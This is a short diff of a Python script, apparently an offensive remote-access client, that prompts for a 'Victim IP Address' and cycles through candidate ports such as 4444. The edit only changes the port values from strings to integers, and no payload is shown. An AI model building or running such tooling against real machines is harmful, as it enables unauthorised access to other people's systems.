@@ -3,8 +3,8 @@ import subprocess
 
 HOST_IP = input('Enter Victim IP Address: ')
 REMOTE_HOST = HOST_IP
-POTENTIAL_PORTS = ['4444','4200','3600','4000','4400']
-REMOTE_PORT = ''
+POTENTIAL_PORTS = [4444, 4200, 3600, 4000, 4400]
+REMOTE_PORT = 0
 port_found = False
 while port_found == False:
    try:
